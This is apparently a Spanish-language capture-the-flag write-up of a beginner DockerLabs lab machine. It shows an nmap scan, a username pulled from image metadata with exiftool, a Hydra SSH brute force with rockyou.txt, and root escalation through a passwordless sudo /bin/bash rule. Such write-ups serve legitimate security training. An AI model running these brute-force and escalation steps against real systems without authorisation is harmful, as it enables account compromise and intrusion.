# Write-up - Escalada con Esteganografía

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 31/05/2025  
**Aprendizaje:** Refresqué conceptos de esteganografía aplicados a pentesting, utilizando herramientas como `ExifTool` y `steghide` (aunque esta última no me sirvió para esta máquina) para extraer información oculta. Además, repasé el uso de `sudo -l` para identificar vectores de escalada de privilegios.

---

## Enumeración y acceso inicial

### 1. Escaneo de puertos

`sudo nmap -sSV -O 10.88.0.2`

> Resultado:

* 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2
* 80/tcp open  http    Apache httpd 2.4.59
* Sistema operativo: Linux 4.X | 5.X

---

### 2. Análisis de imagen descargada

Se descarga una imagen del sitio y se renombra como `IMG`. Luego se analiza con:

`exiftool IMG`

> Resultado:  

Se encuentra un metadato que revela el nombre de usuario: `borazuwarah`.

---

### 3. Ataque de fuerza bruta con Hydra

`hydra -l borazuwarah -P rockyou.txt -V ssh://10.88.0.2`

> Credenciales encontradas:  

Usuario: `borazuwarah`      
Contraseña: `123456`   

---

### 4. Verificación de permisos sudo

`sudo -l`

> Resultado:

`User borazuwarah may run the following commands on 99533418d0c8:`  
`(ALL : ALL) ALL`  
`(ALL) NOPASSWD: /bin/bash`  

> El usuario puede ejecutar `/bin/bash` como cualquier otro usuario sin necesidad de contraseña.

---

### 5. Escalada de privilegios

`sudo /bin/bash`

ó directamente:

`sudo su`

---

### 6. Verificación

> whoami = `root`
